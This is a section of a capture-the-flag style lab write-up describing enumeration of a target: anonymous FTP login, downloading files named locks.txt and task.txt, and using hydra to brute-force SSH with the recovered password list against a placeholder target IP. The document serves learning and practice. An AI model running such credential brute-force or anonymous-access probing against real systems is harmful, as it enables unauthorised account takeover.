# 📁 Step 2: Enumeration (Looking Around)

## 🎯 What I Did

I enumerated FTP and SSH to find useful information.

---

## 🛠️ FTP Enumeration

### Connect to FTP

```bash
ftp <TARGET_IP>
```

**Login:**
- Username: `anonymous`
- Password: (blank or any email)

### What I Found

```
Connected to <TARGET_IP>.
220 (vsFTPd 3.0.3)
Name: anonymous
331 Please specify the password.
Password:
230 Login successful.
```

### List Files

```bash
ftp> ls
```

**Files found:**
- `locks.txt`
- `task.txt`

### Download Files

```bash
ftp> get locks.txt
ftp> get task.txt
ftp> exit
```

### Read Files

```bash
cat task.txt
cat locks.txt
```

**What I learned:**
- `task.txt` = A note from the admin
- `locks.txt` = A list of passwords!

---

## 🛠️ SSH Enumeration

### Check for Valid User

From `task.txt`, I found a username!

### Brute Force SSH

```bash
hydra -l <username> -P locks.txt ssh://<TARGET_IP>
```

**What this does:**
- `-l` = Single username
- `-P` = Password list (from FTP)
- `ssh://` = Target service

**Result:** Found valid credentials!

---

## 📊 What I Found

| Finding | Value |
|---------|-------|
| FTP Access | Anonymous login allowed |
| Files | `locks.txt`, `task.txt` |
| Username | From `task.txt` |
| Password | From `locks.txt` via Hydra |

---

## 🚀 Next Step

Let's exploit! → [03-exploitation](../03-exploitation/)

---

**Made with 💜 by Swoyon**
